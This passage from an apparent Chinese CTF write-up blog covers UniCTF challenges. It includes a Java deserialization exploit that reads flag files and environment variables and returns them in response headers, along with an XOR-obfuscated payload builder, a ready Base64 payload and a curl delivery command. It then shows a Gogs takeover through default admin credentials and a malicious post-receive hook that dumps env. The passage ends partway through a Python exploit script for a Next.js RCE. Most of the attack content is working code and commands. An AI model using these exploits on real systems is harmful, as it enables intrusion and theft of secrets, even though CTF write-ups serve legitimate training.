public Exploit() throws Exception &#123;</span><br><span class="line">         Thread.sleep(3000);</span><br><span class="line">         String flag = readFlag();</span><br><span class="line">         if (flag == null || flag.isEmpty()) &#123;</span><br><span class="line">             flag = &quot;NOFLAG&quot;;</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         try &#123;</span><br><span class="line">             String b64 = Base64.getEncoder().encodeToString(flag.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">             Object resp = null;</span><br><span class="line"> </span><br><span class="line">             // Spring RequestContextHolder</span><br><span class="line">             try &#123;</span><br><span class="line">                 Class&lt;?&gt; holder = Class.forName(&quot;org.springframework.web.context.request.RequestContextHolder&quot;);</span><br><span class="line">                 Object attrs = holder.getMethod(&quot;getRequestAttributes&quot;).invoke(null);</span><br><span class="line">                 if (attrs != null) &#123;</span><br><span class="line">                     Class&lt;?&gt; sra = Class.forName(&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;);</span><br><span class="line">                     if (sra.isInstance(attrs)) &#123;</span><br><span class="line">                         resp = sra.getMethod(&quot;getResponse&quot;).invoke(attrs);</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125; catch (Throwable ignored) &#123;</span><br><span class="line">             &#125;</span><br><span class="line"> </span><br><span class="line">             // Tomcat ApplicationFilterChain fallback</span><br><span class="line">             if (resp == null) &#123;</span><br><span class="line">                 try &#123;</span><br><span class="line">                     Class&lt;?&gt; afc = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;);</span><br><span class="line">                     try &#123;</span><br><span class="line">                         resp = afc.getMethod(&quot;getLastServicedResponse&quot;).invoke(null);</span><br><span class="line">                     &#125; catch (NoSuchMethodException nsme) &#123;</span><br><span class="line">                         java.lang.reflect.Field f = afc.getDeclaredField(&quot;lastServicedResponse&quot;);</span><br><span class="line">                         f.setAccessible(true);</span><br><span class="line">                         Object tl = f.get(null);</span><br><span class="line">                         if (tl instanceof ThreadLocal) &#123;</span><br><span class="line">                             resp = ((ThreadLocal&lt;?&gt;) tl).get();</span><br><span class="line">                         &#125;</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125; catch (Throwable ignored) &#123;</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line"> </span><br><span class="line">             if (resp != null) &#123;</span><br><span class="line">                 try &#123;</span><br><span class="line">                     Class&lt;?&gt; respClass = Class.forName(&quot;javax.servlet.http.HttpServletResponse&quot;);</span><br><span class="line">                     respClass.getMethod(&quot;setHeader&quot;, String.class, String.class).invoke(resp, &quot;X-Flag&quot;, flag);</span><br><span class="line">                     respClass.getMethod(&quot;setHeader&quot;, String.class, String.class).invoke(resp, &quot;X-Flag-B64&quot;, b64);</span><br><span class="line">                 &#125; catch (Throwable ignored) &#123;</span><br><span class="line">                 &#125;</span><br><span class="line">                 try &#123;</span><br><span class="line">                     Class&lt;?&gt; respClass = Class.forName(&quot;javax.servlet.ServletResponse&quot;);</span><br><span class="line">                     Object writer = respClass.getMethod(&quot;getWriter&quot;).invoke(resp);</span><br><span class="line">                     writer.getClass().getMethod(&quot;write&quot;, String.class).invoke(writer, &quot;FLAG:&quot; + flag + &quot;\n&quot;);</span><br><span class="line">                     writer.getClass().getMethod(&quot;flush&quot;).invoke(writer);</span><br><span class="line">                 &#125; catch (Throwable ignored) &#123;</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125; catch (Throwable ignored) &#123;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     private String readFlag() &#123;</span><br><span class="line">         String[] paths = new String[] &#123;</span><br><span class="line">             &quot;/flag&quot;,</span><br><span class="line">             &quot;/flag.txt&quot;,</span><br><span class="line">             &quot;/app/flag&quot;,</span><br><span class="line">             &quot;/app/flag.txt&quot;,</span><br><span class="line">             &quot;/home/ctf/flag&quot;,</span><br><span class="line">             &quot;/home/ctf/flag.txt&quot;</span><br><span class="line">         &#125;;</span><br><span class="line"> </span><br><span class="line">         for (String p : paths) &#123;</span><br><span class="line">             try &#123;</span><br><span class="line">                 File f = new File(p);</span><br><span class="line">                 if (!f.exists() || !f.isFile()) &#123;</span><br><span class="line">                     continue;</span><br><span class="line">                 &#125;</span><br><span class="line">                 try (BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(f), StandardCharsets.UTF_8))) &#123;</span><br><span class="line">                     String line = br.readLine();</span><br><span class="line">                     if (line != null &amp;&amp; !line.isEmpty()) &#123;</span><br><span class="line">                         return line;</span><br><span class="line">                     &#125;</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125; catch (Exception ignored) &#123;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         String flag = System.getenv(&quot;FLAG&quot;);</span><br><span class="line">         if (flag != null &amp;&amp; !flag.isEmpty()) &#123;</span><br><span class="line">             return flag;</span><br><span class="line">         &#125;</span><br><span class="line">         flag = System.getProperty(&quot;flag&quot;);</span><br><span class="line">         if (flag != null &amp;&amp; !flag.isEmpty()) &#123;</span><br><span class="line">             return flag;</span><br><span class="line">         &#125;</span><br><span class="line">         return &quot;&quot;;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>MakePayloadCfg.java：构造满足 readUTF&#x2F;readInt&#x2F;readObject 的流</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> import com.unictf.ctf.tools.ConfigDataWrapper;</span><br><span class="line"> import java.io.ByteArrayOutputStream;</span><br><span class="line"> import java.io.ObjectOutputStream;</span><br><span class="line"> import java.nio.file.Files;</span><br><span class="line"> import java.nio.file.Paths;</span><br><span class="line"> import java.util.Base64;</span><br><span class="line"> </span><br><span class="line"> public class MakePayloadCfg &#123;</span><br><span class="line">     public static void main(String[] args) throws Exception &#123;</span><br><span class="line">         if (args.length &lt; 1) &#123;</span><br><span class="line">             System.err.println(&quot;Usage: MakePayloadCfg &lt;Exploit.class path&gt;&quot;);</span><br><span class="line">             return;</span><br><span class="line">         &#125;</span><br><span class="line">         byte[] classBytes = Files.readAllBytes(Paths.get(args[0]));</span><br><span class="line">         byte[] obfuscated = new byte[classBytes.length];</span><br><span class="line">         for (int i = 0; i &lt; classBytes.length; i++) &#123;</span><br><span class="line">             obfuscated[i] = (byte) (classBytes[i] ^ 0xFF);</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         ConfigDataWrapper cfg = new ConfigDataWrapper();</span><br><span class="line">         cfg.setConfigId(&quot;CONF-2025&quot;);</span><br><span class="line">         cfg.setSign(&quot;ready&quot;);</span><br><span class="line">         cfg.setClassByte(obfuscated);</span><br><span class="line">         cfg.addMetadata(&quot;creator&quot;, &quot;InternalManager&quot;);</span><br><span class="line"> </span><br><span class="line">         ByteArrayOutputStream bos = new ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream oos = new ObjectOutputStream(bos);</span><br><span class="line">         oos.writeUTF(&quot;InternalManager&quot;);</span><br><span class="line">         oos.writeInt(2025);</span><br><span class="line">         oos.writeObject(cfg);</span><br><span class="line">         oos.close();</span><br><span class="line"> </span><br><span class="line">         String b64 = Base64.getEncoder().encodeToString(bos.toByteArray());</span><br><span class="line">         System.out.println(b64);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>payload_cfg.b64：最终可直接投递的 Base64</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> rO0ABXcVAA9JbnRlcm5hbE1hbmFnZXIAAAfpc3IAJmNvbS51bmljdGYuY3RmLnRvb2xzLkNvbmZpZ0RhdGFXcmFwcGVyAAAAAYrFIVcCAAZJAAhjaGVja3N1bUoADGxhc3RNb2RpZmllZFsACUNsYXNzQnl0ZXQAAltCTAAIY29uZmlnSWR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhtZXRhZGF0YXQAD0xqYXZhL3V0aWwvTWFwO0wABHNpZ25xAH4AAnhwAAAAAAAAAZwKRyBJdXIAAltCrPMX+AYIVOACAAB4cAAADy01AUVB////y/8m9f/9//z4//vz//r/+f7/75WeiZ7Qk56RmNCwnZWanIv+//nDlpGWi8H+//zX1qn6////////9Ef1//X/9Pj/8/P/8v/x/v/vlZ6JntCTnpGY0KuXjZqem/7/+oyTmpqP/v/717XWqfX/7//u+P/t8//s/+v+//i6h4+TkJaL/v/3jZqem7mTnpj+/+vX1rOVnome0JOekZjQrIuNlpGYxPX/6f/o+P/n8//m/+X+/++Vnome0JOekZjQrIuNlpGY/v/4loy6ko+Lhv7//NfWpff/4/7/+bGwubO+uPX/4f/g+P/f8//e/93+/++Vnome0IqLlpPQvZ6MmsnL/v/1mJqLupGckJuajf7/49fWs5WeiZ7QiouWk9C9noyaycvbupGckJuajcT2/9v/2vj/2fP/2P/X/v/elZ6JntCRlpDQnJeejYyai9Csi56Rm56Nm7yXno2MmouM/v/6qqu5oMf+/+WzlZ6JntCRlpDQnJeejYyai9C8l56NjJqLxPX/6f/V8//U/9P+//eYmou9houajP7/4dezlZ6JntCRlpDQnJeejYyai9C8l56NjJqLxNakvfX/0f/Q+P/P8//O/83+/+eVnome0IqLlpPQvZ6MmsnL27qRnJCbmo3+//GakZyQm5qrkKyLjZaRmP7/6dekvdazlZ6JntCTnpGY0KyLjZaRmMT3/8v+/8OQjZjRjI+NlpGYmY2ekpqIkI2U0YiandGckJGLmoeL0Y2ajoqajIvRrZqOipqMi7yQkYuah4u3kJObmo31/8n/yPj/x/P/xv/F/v/wlZ6JntCTnpGY0LyTnoyM/v/4mZCNsZ6Smv7/2tezlZ6JntCTnpGY0KyLjZaRmMTWs5WeiZ7Qk56RmNC8k56MjMT3/8P+/+uYmoutmo6KmoyLvouLjZadiouajPX/yf/B8//A/7/+//aYmouymouXkJv+/7/Xs5WeiZ7Qk56RmNCsi42WkZjEpLOVnome0JOekZjQvJOejIzE1rOVnome0JOekZjQjZqZk5qci9CymouXkJvE9f+9/7z4/7vz/7r/uf7/55WeiZ7Qk56RmNCNmpmTmpyL0LKai5eQm/7/+ZaRiZCUmv7/xtezlZ6JntCTnpGY0LCdlZqci8Sks5WeiZ7Qk56RmNCwnZWanIvE1rOVnome0JOekZjQsJ2VmpyLxPf/t/7/v5CNmNGMj42WkZiZjZ6SmoiQjZTRiJqd0ZyQkYuah4vRjZqOipqMi9Gsmo2Jk5qLrZqOipqMi76Li42WnYqLmoz1/8n/tfP/tP+z/v/1loy2kYyLnpGcmv7/6tezlZ6JntCTnpGY0LCdlZqci8TWpff/sf7/9Jiai62ajI+QkYya+P+v/v/slZ6JntCTnpGY0KuXjZCInp2Tmvf/rf7/0JCNmNGej56cl5rRnJ6LnpOWkZ7RnJCNmtG+j4+Tlpyei5aQkbmWk4uajbyXnpaR9/+r/v/omJqLs56Mi6yajYmWnJqbrZqMj5CRjJr4/6n+/+CVnome0JOekZjQsZCsipyXspqLl5Cbuoecmo+LlpCR9/+n/v/rk56Mi6yajYmWnJqbrZqMj5CRjJr1/8n/pfP/pP+j/v/vmJqLu5qck56Nmpu5lpqTm/7/0tezlZ6JntCTnpGY0KyLjZaRmMTWs5WeiZ7Qk56RmNCNmpmTmpyL0LmWmpObxPX/of+g+P+f8/+e/53+/+iVnome0JOekZjQjZqZk5qci9C5lpqTm/7/8oyai76cnJqMjJadk5r+//vXpdap9f+h/5vz/5r/mf7//Jiai/7/2dezlZ6JntCTnpGY0LCdlZqci8TWs5WeiZ7Qk56RmNCwnZWanIvE+P+X/v/qlZ6JntCTnpGY0KuXjZqem7OQnJ6T9f+Y/5Xz/5r/lP7/69fWs5WeiZ7Qk56RmNCwnZWanIvE9/+S/v/ZlZ6JnofRjJqNiZOai9GXi4uP0beLi4+smo2Jk5qLrZqMj5CRjJr3/5D+//aMmou3mp6bmo33/47+//mn0rmTnpj3/4z+//Wn0rmTnpjSvcnL9/+K/v/ilZ6JnofRjJqNiZOai9Gsmo2Jk5qLrZqMj5CRjJr3/4j+//aYmouojZaLmo31//3/hvP/hf+E/v/3mJqLvJOejIz+/+zX1rOVnome0JOekZjQvJOejIzE9/+C/v/6iI2Wi5r4/4D+/+iVnome0JOekZjQrIuNlpGYvYqWk5uajfX/gf/89/99/v/6ubO+uMX1/4H/e/P/ev95/v/5no+PmpGb/v/S17OVnome0JOekZjQrIuNlpGYxNazlZ6JntCTnpGY0KyLjZaRmL2KlpObmo3E9/93/v/+9fX/gf918/90/+v+//eLkKyLjZaRmPf/cv7/+pmTioyX9/9w/v/60JmTnpj3/27+//bQmZOemNGLh4v3/2z+//bQno+P0JmTnpj3/2r+//LQno+P0JmTnpjRi4eL9/9o/v/x0JeQkprQnIuZ0JmTnpj3/2b+/+3Ql5CSmtCci5nQmZOemNGLh4v4/2T+//OVnome0JaQ0LmWk5r1/2X/YvP/+v9h/v/q17OVnome0JOekZjQrIuNlpGYxNap9f9l/1/z/17/5f7/+ZqHloyLjPX/Zf9c8/9b/+X+//mWjLmWk5r4/1n+/+mVnome0JaQ0L2KmZmajZqbrZqem5qN+P9X/v/mlZ6JntCWkNC2kY+Ki6yLjZqekq2anpuajfj/Vf7/6JWeiZ7QlpDQuZaTmraRj4qLrIuNmp6S9f9W/1Pz//r/Uv7/7tezlZ6JntCWkNC5lpOaxNap9f9Y/1Dz//r/T/7/zdezlZ6JntCWkNC2kY+Ki6yLjZqeksSzlZ6JntCRlpDQnJeejYyai9C8l56NjJqLxNap9f9a/03z//r/TP7/7NezlZ6JntCWkNCtmp6bmo3E1qn1/1r/SvP/Sf/r/v/3jZqem7OWkZr1/1r/R/P/Rv/5/v/6nJOQjJr1/7D/RPP/Q/9C/v/ynpubrIqPj42ajIyam/7/59ezlZ6JntCTnpGY0KuXjZCInp2TmsTWqfj/QP7/7JWeiZ7Qk56RmNC6h5yaj4uWkJH3/z7+//u5s7649f88/zv4/zrz/zn/OP7/75WeiZ7Qk56RmNCshoyLmpL+//mYmouakYn+/9nXs5WeiZ7Qk56RmNCsi42WkZjE1rOVnome0JOekZjQrIuNlpGYxPf/Nv7/+5mTnpj1/zz/NPP/M/84/v/0mJqLr42Qj5qNi4b3/zH+///+//u8kJua/v/ws5aRmrGKkp2ajauenZOa/v/yrIuenJSyno+rnp2Tmv7/9bqHnJqPi5aQkYz4/yv+/+yks5WeiZ7Qk56RmNCsi42WkZjE/v/1rJCKjZyauZaTmv7/87qHj5OQlovRlZ6Jnv7/87aRkZqNvJOejIyajP7/+LqRnJCbmo3/3v/v//3///////3//v/6//n//f8w///9G//4//f///5h1Uj//uv/+Ef/9tVI//Cz1Dn/9dRJ/+pm//nt5LNH/+LUTf/cSf/WSf/Ssv6x7cxH/8rF++b77cT8Qv/JSf/C/vxC//1J/77F+ub6Of/W7bhH/8rF+eb55vpJ/7Zm/+fm+e2y/EL/yUn/wub6/EL//Un/vrFY//rF+9I4/6/trkf/ysX75vvtrPxC/8lJ/8L+/EL//Un/vrFY/9LF+ub77ahJ/6bF+eb5+0n/oub5/kn/nMX45vg+/5hm//Pm+D//mEn/lrFY//rF+9I5/zHtk0f/ysX75vvtkfpC/8mm/O3prKb77emsSf/C0vpC//2m/O2PrKb71KxJ/76o5vvtkfpC/8mm/O3prKb77emsSf/C0vpC//2m/O2NrKb706xJ/76oWP/6xfvti0f/ysX75vvtifxC/8lJ/8LS/EL//Un/vsX65vpJ/4ftg/tC/8mm/O3prEn/wub6+0L//ab8RP+Bpkj/f+1+Sf981En/fO14Sf98Sf92rEn/vqjm+kn/h+1z/EL/yUn/wub6/EL//Un/vqhY//rF+1j/+7JO//n/0v+L/4j/sP97/2f/ZP+q/4L/Ov83/7D/Mf7c/tn/sP7X/mv+aP+w/+L+Zv5j/7D//f8v////Vf/V////9v/7//X/9f/0//D/8//l//L/4v/u/9T/7f/S/+n/y//o/7b/5/+x/+b/qv/l/6D/5P+L/+D/iP/h/4b/3f+C/9v/e//Z/2f/0f9k/9j/Yv/X/1n/1v9T/9X/S//U/0P/0/86/8//N//Q/zX/zP8x/8r/Kv/J/wP/yP7c/8b+2f/H/tf/xP7Q/8P+u//C/oP/wf5r/7/+aP/A/mb/vP5j/73+Yv+7/y7///+r//AA/+X//fj/7/j/6f///QL/qfj/6fj//b34/7D+AP/e//r4/+/4/+n4/+n4//34/8n//vj/qgX/1r34/7D+CP+k+P+w/gj/kfj/sAb//r34/7D//y3////7//7/Qf/9/+z/6//+/zD///4f//j/9f///xvv+UL/6ab87XGspvvtb6ym+u1trKb57Wuspvjtaaym9+1nrLPUstNBwfzJ++r74l3/c9Pq+83F+kT/Zabm+kj/Y8X55vlJ/2Bm//Tm+Un/XWX/+Vj/nUT/WqZE/1imRP9Wpub5SP9UTf/cSP9RSP9Oxfjm+En/S8X35vc5/+jm90n/6mX/8Ob3xfbm+En/SOb2T+b4Sf9IWP/mxffm+En/SFj/88X25vfm9kn/Reb3QFj/+sX5e/v+WACL7T9H/z2y0zn/89NJ/+pl//rTT+03R/81stM5//PTSf/qZf/600/tMk//+v+N/3X/Zf+w/2P/Xv9b/7D/x/+s/0z/Qf+p/3D/TP9B/23/T/9M/0H//f8v////of/o////uP/b/6//x/+t/7z/rP+s/6v/qf+p/43/qP+G/6f/ef+m/3X/pP9w/6b/bf+k/2X/qf9P/6L/TP+j/0r/r/9E/5//Pv+e/zP/nf8x/5v/K/+a/yD/mf8e/5f/Lv///6H/8gD/0//6+P/v+P8s+P8s/v7//wL/2fj/6fj/Zf0D/8T4/1q4+P+wAP/2//b4/+/4/yz4/yz+/vj/6fj/Zfj/Wvj/sP/++P+w9wf//b34/0EF//4H//oD/+34/+nt//3/Kv////3/Kf8o////9f/+/9H/4f8n//Z0AAlDT05GLTIwMjVzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAXQAB2NyZWF0b3J0AA9JbnRlcm5hbE1hbmFnZXJ4dAAFcmVhZHk=</span><br></pre></td></tr></table></figure>
+
+<p>关键命令示例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> # 编译 payload（目标 JVM 不确定，使用 --release 8 兼容）</span><br><span class="line"> cd d:\code\temp\unictf_payload</span><br><span class="line"> javac --release 8 com\unictf\ctf\tools\ConfigDataWrapper.java Exploit.java MakePayloadCfg.java</span><br><span class="line"> java MakePayloadCfg Exploit.class &gt; payload_cfg.b64 # 投递并查看响应头/体</span><br><span class="line"> curl.exe -i -s -X POST --data-urlencode &quot;configData@d:\code\temp\unictf_payload\payload_cfg.b64&quot; ^  &quot;http://8888-a9d7cc25-d52f-4333-b3d2-3d4d50519a7d.challenge.ctfplus.cn/api/user/settings/import&quot;</span><br></pre></td></tr></table></figure>
+
+<p>响应里包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> X-Flag: UniCTF&#123;sh1z1-51b7cedc-a471-47a3-8918-7c0f88daff68&#125; FLAG:UniCTF&#123;sh1z1-51b7cedc-a471-</span><br></pre></td></tr></table></figure>
+
+<h3 id="gogogos"><a href="#gogogos" class="headerlink" title="gogogos"></a><strong>gogogos</strong></h3><p>解题思路（简要）</p>
+<ul>
+<li>站点是 Gogs，默认账号弱口令 ctf&#x2F;ctf，且是管理员。</li>
+<li>管理员可在仓库 Git Hooks 写入 post-receive 脚本（服务器执行）。</li>
+<li>触发一次 push → hook 执行 → 输出 env（含 FLAG）到仓库文件。</li>
+<li>访问 raw 文件拿到 flag。</li>
+</ul>
+<p>操作步骤（Burp + MCP 也可复现）</p>
+<ol>
+<li>登录</li>
+</ol>
+<ul>
+<li>GET &#x2F;user&#x2F;login 抓取 _csrf</li>
+<li>POST &#x2F;user&#x2F;login<ul>
+<li>表单：user_name&#x3D;ctf&amp;password&#x3D;ctf&amp;_csrf&#x3D;…</li>
+<li>记得同时带 Cookie：_csrf&#x3D;&lt;同值&gt;</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>创建仓库（如 test）</li>
+</ol>
+<ul>
+<li>GET &#x2F;repo&#x2F;create 取 _csrf</li>
+<li>POST &#x2F;repo&#x2F;create（repo_name&#x3D;test&amp;private&#x3D;on&amp;auto_init&#x3D;on&amp;_csrf&#x3D;…）</li>
+</ul>
+<ol>
+<li>写入 Git Hook</li>
+</ol>
+<ul>
+<li>进入：&#x2F;ctf&#x2F;test&#x2F;settings&#x2F;hooks&#x2F;git&#x2F;post-receive</li>
+<li>POST 同路径，提交 content 为脚本：</li>
+</ul>
+<p>#!&#x2F;bin&#x2F;sh<br>  GIT_DIR&#x3D;”$(pwd)”<br>  WT&#x3D;$(mktemp -d)<br>  git –git-dir&#x3D;”$GIT_DIR” –work-tree&#x3D;”$WT” checkout -f master <br>    || git –git-dir&#x3D;”$GIT_DIR” –work-tree&#x3D;”$WT” checkout -f -b master<br>  env | sort &gt; “$WT&#x2F;flag_dump.txt”<br>  git –git-dir&#x3D;”$GIT_DIR” –work-tree&#x3D;”$WT” add flag_dump.txt<br>  git –git-dir&#x3D;”$GIT_DIR” –work-tree&#x3D;”$WT” -c user.name&#x3D;ctf -c user.email&#x3D;ctf@local commit -m “dump env” || true</p>
+<ol>
+<li>触发 hook（push 一次即可）</li>
+</ol>
+<p>git clone <a target="_blank" rel="noopener" href="http://ctf:ctf@3000-eb2121d4-0ac0-4437-9393-f2b8241be540.challenge.ctfplus.cn/ctf/test.git">http://ctf:ctf@3000-eb2121d4-0ac0-4437-9393-f2b8241be540.challenge.ctfplus.cn/ctf/test.git</a><br>  cd test<br>  echo trigger &gt;&gt; trigger.txt<br>  git add trigger.txt<br>  git commit -m trigger<br>  git push</p>
+<ol>
+<li>读取 flag</li>
+</ol>
+<ul>
+<li>访问：&#x2F;ctf&#x2F;test&#x2F;raw&#x2F;master&#x2F;flag_dump.txt</li>
+<li>文件里能看到：</li>
+</ul>
+<p>FLAG&#x3D;UniCTF{5550e4b6-8692-4f8f-b93b-3e8654251baf}</p>
+<p>命令示例（可选）</p>
+<ul>
+<li>直接 curl raw（带 basic auth）：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> curl -u ctf:ctf \</span><br><span class="line">   http://3000-eb2121d4-0ac0-4437-9393-f2b8241be540.challenge.ctfplus.cn/ctf/test/raw/master/flag_dump.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="miowaf"><a href="#miowaf" class="headerlink" title="miowaf"></a><strong>miowaf</strong></h3><p>开局是打有过滤的cve-2025-55182，github找到一个仓库<a target="_blank" rel="noopener" href="https://github.com/ynsmroztas/NextRce">https://github.com/ynsmroztas/NextRce</a></p>
+<p>牛逼队友直接写了个脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"> #!/usr/bin/env python3</span><br><span class="line"> import argparse</span><br><span class="line"> import base64</span><br><span class="line"> import math</span><br><span class="line"> import socket</span><br><span class="line"> import sys</span><br><span class="line"> from urllib.parse import urlparse</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> UA = &quot;Mozilla/5.0&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> def _http_get(url: str, timeout: float) -&gt; str:</span><br><span class="line">     # Try requests if available; fallback to urllib</span><br><span class="line">     try:</span><br><span class="line">         import requests  # type: ignore</span><br><span class="line"> </span><br><span class="line">         r = requests.get(</span><br><span class="line">             url,</span><br><span class="line">             headers=&#123;&quot;User-Agent&quot;: UA, &quot;Accept-Encoding&quot;: &quot;identity&quot;&#125;,</span><br><span class="line">             timeout=timeout,</span><br><span class="line">         )</span><br><span class="line">         return r.text</span><br><span class="line">     except Exception:</span><br><span class="line">         import urllib.request</span><br><span class="line"> </span><br><span class="line">         req = urllib.request.Request(</span><br><span class="line">             url,</span><br><span class="line">             headers=&#123;&quot;User-Agent&quot;: UA, &quot;Accept-Encoding&quot;: 